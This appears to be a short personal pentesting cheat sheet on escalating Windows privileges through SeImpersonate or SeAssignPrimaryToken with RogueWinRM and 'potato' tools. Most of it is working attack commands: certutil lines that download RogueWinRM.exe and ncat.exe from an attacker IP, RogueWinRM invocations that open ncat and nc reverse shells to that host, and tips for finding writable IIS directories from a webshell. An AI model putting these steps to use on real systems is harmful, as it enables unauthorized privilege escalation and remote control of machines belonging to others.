
if we have the privileges `SeImpersonate` or `SeAssignPrimaryToken` we can exploit this by:
	1. spawn a process that users can connect and authenticate to
	2. force privileged users to connect and authenticate

Account that usually have these are: `LOCAL SERVICE`, `NETWORK SERVICE ACCOUNTS`, `iis apppool\defaultapppool`, others?

If bits is not running:s
	Upload RogueWinRM exploit https://github.com/antonioCoco/RogueWinRM
		The story https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/
	if webshell - looking for writeable dir on iis
		looking for dir where iis account has write: `C:\Windows\Microsoft.NET\Framework\<version>\Temporary ASP.NET Files\`
		`cd C:\Windows\Microsoft.NET\Framework\ && dir`
		`cd "C:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files" && dir`
		`c:\windows\temp` might also work
	 `certutil -urlcache -split -f "http://10.18.21.236:8000/tools/RogueWinRM.exe" "C:\Windows\temp\RogueWinRM.exe"`
	 `certutil -urlcache -split -f "http://10.18.21.236:8000/tools/ncat.exe" "C:\Windows\temp\ncat.exe"`
	`C:\Windows\temp\RogueWinRM.exe -p "C:\windows\temp\ncat.exe" -a "-e cmd.exe 10.18.21.236 443"`
	or `RogueWinRM.exe -p C:\windows\system32\cmd.exe` for interactive cmd
	`RogueWinRM.exe -p C:\windows\temp\nc64.exe -a "10.0.0.1 3001 -e cmd"` for nc reverse shell
	(since this starts the bits service there will be a delay of about 2 min until you can run this successfully again)

Generally the tools to look for are potatoes. A lot of the available ones are old and doesn't work. Here's what's worked for me:
	PetitPotato - https://github.com/wh0amitz/PetitPotato/releases/tag/v1.0.0
	

